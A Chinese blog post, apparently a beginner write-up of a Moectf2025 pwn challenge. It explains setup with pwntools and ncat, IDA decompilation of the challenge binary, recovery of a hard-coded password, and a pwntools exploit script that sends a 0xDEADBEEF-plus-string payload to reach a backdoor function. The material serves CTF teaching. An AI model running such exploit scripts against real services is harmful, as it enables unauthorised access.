

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/76E788D4FCBABFED3D3EEC49B77753E5.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Koyanrush">
  <meta name="keywords" content="">
  
    <meta name="description" content="é¢˜ç›®æ¥æºï¼šMoectf2025              æ¸©é¦¨æç¤ºï¼šç¡®ä¿æœ‰å®‰è£…äº†è‡³å°‘ä¸€å¥—Pythonçš„æ“ä½œç³»ç»Ÿå†æ¥å“¦                          ç”±äºæ­¤ç±»é¢˜ç›®éœ€è¦å¯åŠ¨åœ¨çº¿ç¯å¢ƒï¼Œæ‰€ä»¥ä¸æä¾›é¢˜ç›®é™„ä»¶ï¼Œéœ€è¦è¯·ç§»æ­¥æ¯”èµ›å¹³å°å“¦             ç‚¹æˆ‘ä¼ é€ğŸ–ï¸ 0 äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—è¿™æ˜¯ä¸€é“å…¥é—¨é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é“é¢˜æ¥åˆæ­¥äº†è§£pwnçš„æµç¨‹ã€‚ åœ¨è§£é¢˜ä¹‹å‰ï¼Œæ‹¥æœ‰ä¸€ä¸ªpwnè§£é¢˜ç¯å¢ƒ">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFåˆ·é¢˜-pwnï¼ˆ1ï¼‰">
<meta property="og:url" content="https://koyanrush.github.io/2026/02/03/Moectfpwn1/index.html">
<meta property="og:site_name" content="Koyan&#39;s World">
<meta property="og:description" content="é¢˜ç›®æ¥æºï¼šMoectf2025              æ¸©é¦¨æç¤ºï¼šç¡®ä¿æœ‰å®‰è£…äº†è‡³å°‘ä¸€å¥—Pythonçš„æ“ä½œç³»ç»Ÿå†æ¥å“¦                          ç”±äºæ­¤ç±»é¢˜ç›®éœ€è¦å¯åŠ¨åœ¨çº¿ç¯å¢ƒï¼Œæ‰€ä»¥ä¸æä¾›é¢˜ç›®é™„ä»¶ï¼Œéœ€è¦è¯·ç§»æ­¥æ¯”èµ›å¹³å°å“¦             ç‚¹æˆ‘ä¼ é€ğŸ–ï¸ 0 äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—è¿™æ˜¯ä¸€é“å…¥é—¨é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é“é¢˜æ¥åˆæ­¥äº†è§£pwnçš„æµç¨‹ã€‚ åœ¨è§£é¢˜ä¹‹å‰ï¼Œæ‹¥æœ‰ä¸€ä¸ªpwnè§£é¢˜ç¯å¢ƒ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20143749.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20143757.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20150534.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20144836.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20144821.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20225051.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20225105.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20225116.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20235032.png">
<meta property="og:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-04%20001241.png">
<meta property="article:published_time" content="2026-02-03T03:00:24.000Z">
<meta property="article:modified_time" content="2026-02-03T16:13:24.747Z">
<meta property="article:author" content="Koyanrush">
<meta property="article:tag" content="ç½‘å®‰ä¹‹è·¯">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://koyanrush.github.io/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20143749.png">
  
  
  
  <title>CTFåˆ·é¢˜-pwnï¼ˆ1ï¼‰ - Koyan&#39;s World</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/custom.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"koyanrush.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 8.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Koyan</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CTFåˆ·é¢˜-pwnï¼ˆ1ï¼‰"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Koyanrush
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2026-02-03 11:00" pubdate>
          2026å¹´2æœˆ3æ—¥ ä¸Šåˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.1k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          26 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CTFåˆ·é¢˜-pwnï¼ˆ1ï¼‰</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äº 2026å¹´2æœˆ4æ—¥ å‡Œæ™¨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>é¢˜ç›®æ¥æºï¼šMoectf2025</p>
<div class="note note-danger">
            <p>æ¸©é¦¨æç¤ºï¼šç¡®ä¿æœ‰å®‰è£…äº†è‡³å°‘ä¸€å¥—Pythonçš„æ“ä½œç³»ç»Ÿå†æ¥å“¦</p>
          </div>

<div class="note note-danger">
            <p>ç”±äºæ­¤ç±»é¢˜ç›®éœ€è¦å¯åŠ¨åœ¨çº¿ç¯å¢ƒï¼Œæ‰€ä»¥ä¸æä¾›é¢˜ç›®é™„ä»¶ï¼Œéœ€è¦è¯·ç§»æ­¥æ¯”èµ›å¹³å°å“¦</p>
          </div>

<p><a href="https://ctf.xidian.edu.cn/" target="_blank">ç‚¹æˆ‘ä¼ é€ğŸ–ï¸</a></p>
<h2 id="0-äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—"><a href="#0-äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—" class="headerlink" title="0 äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—"></a>0 äºŒè¿›åˆ¶æ¼æ´å®¡è®¡å…¥é—¨æŒ‡åŒ—</h2><p>è¿™æ˜¯ä¸€é“å…¥é—¨é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é“é¢˜æ¥åˆæ­¥äº†è§£pwnçš„æµç¨‹ã€‚</p>
<p>åœ¨è§£é¢˜ä¹‹å‰ï¼Œæ‹¥æœ‰ä¸€ä¸ªpwnè§£é¢˜ç¯å¢ƒè‡³å…³é‡è¦ã€‚é¢˜ç›®é™„ä»¶çš„pdfä¸­æä¾›äº†ç›¸å½“å…¨é¢çš„ç¯å¢ƒæ­å»ºå»ºè®®ï¼Œä½†å¯¹åˆå­¦è€…è€Œè¨€éš¾åº¦è¾ƒé«˜ï¼Œæ¨èè¾¹åšè¾¹å­¦ã€‚</p>
<p>å…ˆå°è¯•è¿æ¥é¢˜ç›®ç¯å¢ƒï¼Œæ­£å¸¸æ¥è¯´ç”¨Linuxç¯å¢ƒæ˜¯æœ€å¥½çš„ï¼Œä½†ç”±äºé¢˜ç›®ä½¿ç”¨WebSocket Reflector Xï¼ˆWSRXï¼‰è¿æ¥ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨Windowsç¯å¢ƒè¿›è¡Œæ¼”ç¤ºã€‚å½“ç„¶ç”¨WSLè™šæ‹Ÿæœºä»€ä¹ˆçš„ä¹Ÿæ˜¯èƒ½è¿æ¥çš„ï¼Œåªä¸è¿‡ç”¨Windowsç¯å¢ƒæœ€ç®€å•ã€‚</p>
<p>é¦–å…ˆå¯åŠ¨WSRXï¼Œæ¥åˆ°é¢˜ç›®å¹³å°å¯åŠ¨åœ¨çº¿ç¯å¢ƒï¼Œç¡®ä¿WSRXå·²è¿æ¥ã€‚</p>
<p>å…·ä½“è¿æ¥æ–¹å¼è¯·é˜…è¯»<a href="https://ctf.xidian.edu.cn/wiki/18" target="_blank">https://ctf.xidian.edu.cn/wiki/18</a>ã€‚</p>
<p>è®°ä¸‹å‡ºç°çš„æœ¬åœ°åœ°å€ã€‚æ¯”å¦‚127.0.0.1:11965ã€‚</p>
<p>æ‰“å¼€Windows PowerShellã€‚è¾“å…¥</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">pip install pwntools<br></code></pre></td></tr></table></figure>

<p>æ²¡æœ‰pipï¼Ÿå…ˆè¾“å…¥è¿™ä¸ªğŸ‘‡</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">python <span class="hljs-literal">-m</span> ensurepip <span class="hljs-literal">--upgrade</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åä½ è¿˜éœ€è¦ä¸€ä¸ªnmapï¼š</p>
<p><a href="https://nmap.org/download.html" target="_blank">https://nmap.org/download.html</a></p>
<p>å®‰è£…æ—¶ç¡®ä¿å‹¾é€‰äº† Ncat ç»„ä»¶ã€‚</p>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰çš„è¯ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤ç¡®è®¤</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">ncat <span class="hljs-literal">--version</span> <br>pwn version<br></code></pre></td></tr></table></figure>

<p>å¦‚æœéƒ½è¾“å‡ºäº†ç‰ˆæœ¬å·ï¼Œå°±è¯´æ˜å®‰è£…æˆåŠŸäº†ã€‚</p>
<p>ä¸‡äº‹å…·å¤‡åï¼Œç¡®ä¿powershellåœ¨æ­£ç¡®çš„ç›®å½•ç”Ÿæ•ˆï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell"><span class="hljs-built_in">cd</span> D:\hellopwn <span class="hljs-comment"># cdåé¢æ›¿æ¢ä¸ºä½ hellopwnçš„å®é™…å­˜æ”¾åœ°å€ï¼Œè¿™æ ·æ‰ä¼šå¯¹é‡Œé¢çš„pwnæ–‡ä»¶ç”Ÿæ•ˆ</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åè¾“å…¥</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">ncat <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">11965</span><br></code></pre></td></tr></table></figure>

<p>ä½ ä¼šçœ‹åˆ°è¿™æ ·çš„è¾“å‡º</p>
<div style="display: flex; justify-content: space-between; gap: 10px;">
  <div style="flex: 1;">
    <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 143749.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
    <p style="text-align: center; font-size: 0.8em;"></p>
  </div>
  <div style="flex: 1;">
    <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 143757.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
    <p style="text-align: center; font-size: 0.8em;"></p>
  </div>
</div>

<p>é‚£ä¸€å †çœ‹ç€åƒä¸­æ–‡çš„ä¹±ç åº”è¯¥æ˜¯æŸç±»å­—ç¬¦ç”»ï¼ˆæ„Ÿè§‰æ˜¯é™„ä»¶é‡Œçš„æ°´ç®­é¾Ÿï¼‰ç”±äºç¼–ç å†²çªè€Œäº§ç”Ÿçš„ï¼Œä¸å½±å“è§£é¢˜ï¼Œå½“ä¸å­˜åœ¨å°±å¥½ã€‚</p>
<p>çœ‹åˆ°</p>
<p><strong>Guess who am i!</strong> </p>
<p><strong>Before u answer me,solve some bypass function!</strong></p>
<p><strong>First,you need to tell me the password.</strong></p>
<p>è¿™å‡ æ¡ï¼Œå°±è¯´æ˜æˆåŠŸè¿æ¥ä¸Šé¢˜ç›®äº†ã€‚</p>
<p>ä½†æ˜¯è¿™æ—¶å€™æˆ‘ä»¬ä¸çŸ¥é“passwordï¼Œè¿™æ—¶å€™å°±è¦ç”¨åˆ°IDAäº†</p>
<p><a href="https://hex-rays.com/" target="_blank">IDA proä»¥åŠfreeç‰ˆè·å–åœ°å€</a></p>
<p>å¯Œå“¥å¯Œå§ä»¬è¯·æ— è„‘è´­ä¹°IDA proï¼Œæ­£ç‰ˆæˆæƒï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œä¹°ä¸äº†åƒäºä¹°ä¸äº†åæ‚”ã€‚å½“ç„¶ä¸€èˆ¬çš„pwné¢˜ç›®å…è´¹ç”³è¯·ä¸€ä¸ªIDA Freeä¹Ÿæ˜¯å¤Ÿç”¨çš„ã€‚</p>
<p>åœ¨IDAæ‰“å¼€pwnæ–‡ä»¶ã€‚æŒ‰F5å°±å¯ä»¥çœ‹åˆ°ç¨‹åºåç¼–è¯‘åçš„ä¼ªä»£ç ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¯»æ‡‚ç ´è§£é€»è¾‘</p>
<figure>
  <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 150534.png" srcset="/img/loading.gif" lazyload>
  <figcaption>åç¼–è¯‘åœ¨pwnå’Œreverseéƒ½ç›¸å½“å¸¸ç”¨</figcaption>
</figure>

<p>åœ¨ä¸‹é¢è¿™ä¸ªä½ç½®å¯ä»¥çœ‹åˆ°åœ¨æ‰“å°å‡ºâ€First,you need to tell me the password.â€è¿™å¥ä¹‹åï¼Œç¨‹åºåœ¨ç­‰å¾…ç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•´æ•°å¹¶ä¸å…¨å±€å˜é‡ passwd æ¯”è¾ƒã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;First,you need to tell me the password.&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>  <span class="hljs-keyword">if</span> ( v4 != passwd )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Maybe you should recall what the password is!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>åŒå‡»passwdå˜é‡ï¼Œä¼šè‡ªåŠ¨å®šä½åˆ°è¿™ä¸€è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">.data:<span class="hljs-number">0000000000004010</span> passwd          dd <span class="hljs-number">1B</span>F4Fh               ; DATA XREF: main+CAâ†‘r<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥passwdçš„å€¼æ˜¯1BF4Fhï¼Œä¹Ÿå°±æ˜¯åå…­è¿›åˆ¶ 0x1BF4F ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶æ˜¯ 114511ã€‚</p>
<p>ç„¶åæ˜¯è¿™é‡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C">read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64u</span>); <br><span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)bypass(buf) ) &#123;<br>    backdoor();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>readå‡½æ•°è¯»å…¥äº†0x64ä¸ªï¼Œä¹Ÿå°±æ˜¯100ä¸ªå­—èŠ‚åˆ°bufï¼Œç„¶åè°ƒç”¨äº†bypasså‡½æ•°ã€‚å¦‚æœbypass(buf)è¿”å›0ï¼Œä¹Ÿå°±æ˜¯if(!0)æ—¶ï¼Œæ‰ä¼šè§¦å‘backdoor()ã€‚</p>
<p>åŒå‡»bypassçœ‹çœ‹æ€ä¹ˆä¸ªäº‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">bypass</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)a1 == <span class="hljs-number">-559038737</span> &amp;&amp; !<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a1 + <span class="hljs-number">4</span>), <span class="hljs-string">&quot;shuijiangui&quot;</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something wrong.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ç§æƒ…å†µå¯ä»¥è¿”å›0ï¼š</p>
<p>ç¬¬ä¸€ç§ï¼ša1ä¸ºç©ºçš„æ—¶å€™ã€‚a1æ˜¯è¾“å…¥ç¼“å†²åŒºçš„èµ·å§‹åœ°å€ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œåœ¨å®é™…æ“ä½œä¸­ï¼Œä¼ å…¥payloadä¸€å®šä¼šè¢«è¯»å…¥ä¸€ä¸ªçœŸå®çš„å†…å­˜åœ°å€ï¼Œå› æ­¤æ— è®ºå¦‚ä½•a1éƒ½ä¸å¯èƒ½ç­‰äº0 ï¼Œè¿™æ¡è·¯èµ°ä¸é€šã€‚</p>
<p>ç¬¬äºŒç§ï¼šéœ€è¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ã€‚</p>
<p>ç¬¬ä¸€æ˜¯<code>*(_DWORD \)a1 == -559038737</code>ï¼Œè¿™é‡Œçš„ <strong><code>*(_DWORD*)a1</code></strong> æ„æ€æ˜¯ä»ç¼“å†²åŒºèµ·å§‹åœ°å€ a1 å¼€å§‹ï¼Œå¾€åè¿ç»­æŠ“å–4ä¸ªå­—èŠ‚çš„å†…å­˜æ•°æ®ï¼ˆ_DWORD ä»£è¡¨ Double Wordï¼Œé€šå¸¸å 4ä¸ªå­—èŠ‚ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´è¦è®©å¼•å…¥çš„payloadçš„å‰å››å­—èŠ‚ä¸º-559038737ï¼Œæ¢ç®—æˆåå…­è¿›åˆ¶æ˜¯<strong>0xDEADBEEF</strong>ï¼›</p>
<p>ç¬¬äºŒä¸ªæ¡ä»¶æ˜¯<code>!strcmp((const char *)(a1 + 4), &quot;shuijiangui&quot;</code>ï¼Œè¿™ä¸ªæœ‰ç‚¹Cè¯­è¨€åŸºç¡€å°±èƒ½çœ‹æ‡‚ï¼Œæ„æ€æ˜¯éœ€è¦è®©payloadä»ç¬¬äº”å­—èŠ‚å¼€å§‹ç­‰äºå­—ç¬¦ä¸²<strong>shuijiangui</strong>ã€‚</p>
<p>è‡³äºéšåè§¦å‘çš„backdoorï¼Œçœ‹åå­—å°±çŸ¥é“è¿™å°±æ˜¯è·å¾—éšè—ä¿¡æ¯çš„åœ°æ–¹ã€‚</p>
<p>è‡³æ­¤æˆ‘ä»¬å·²ç»æ‘¸é€äº†é¢˜ç›®é€»è¾‘ï¼Œç»“åˆä¼ªä»£ç çš„ç»“æ„ï¼Œæˆ‘ä»¬ä¾¿èƒ½å†™å‡ºæ”»å‡»è„šæœ¬ï¼Œä¿å­˜ä¸ºexp.pyï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># ç”±äºæ˜¯åœ¨ Windows è¿è¡Œï¼Œå¯ä»¥ä¸è®¾ context.terminal</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># 1. æ­¤æ—¶ç›´æ¥è¿æ¥ WSRX å®¢æˆ·ç«¯æ˜¾ç¤ºçš„æœ¬åœ°ç«¯å£</span><br><span class="hljs-comment"># è¯·æ ¹æ®ä½  WSRX ç•Œé¢ä¸Šæœ€æ–°çš„è“è‰²æ•°å­—ä¿®æ”¹ç«¯å£å·ï¼ˆä¾‹å¦‚ 11965ï¼‰</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">11965</span>) <br><br><span class="hljs-comment"># 2. ç¬¬ä¸€å…³ï¼šå¯†ç </span><br>p.recvuntil(<span class="hljs-string">b&quot;tell me the password.&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;114511&#x27;</span>) <span class="hljs-comment"># å¯†ç  0x1BF4F å¯¹åº” 114511</span><br><br><span class="hljs-comment"># 3. ç­‰å¾…ç¼“å†²</span><br>time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-comment"># 4. ç¬¬äºŒå…³ï¼šPayload</span><br><span class="hljs-comment"># p32(0xdeadbeef) å¯¹åº” -559038737</span><br>payload = p32(<span class="hljs-number">0xdeadbeef</span>) + <span class="hljs-string">b&#x27;shuijiangui\x00&#x27;</span><br>p.send(payload)<br><br><span class="hljs-comment"># 5. äº¤äº’</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨å½“å‰ç›®å½•è¿è¡Œè¿™ä¸ªè„šæœ¬ã€‚</p>
<div style="display: flex; justify-content: space-between; gap: 10px;">
  <div style="flex: 1;">
    <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 144836.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
    <p style="text-align: center; font-size: 0.8em;"></p>
  </div>
  <div style="flex: 1;">
    <img src="/img/å±å¹•æˆªå›¾ 2026-02-03 144821.png" srcset="/img/loading.gif" lazyload style="width: 100%; border-radius: 8px;">
    <p style="text-align: center; font-size: 0.8em;"></p>
  </div>
</div>

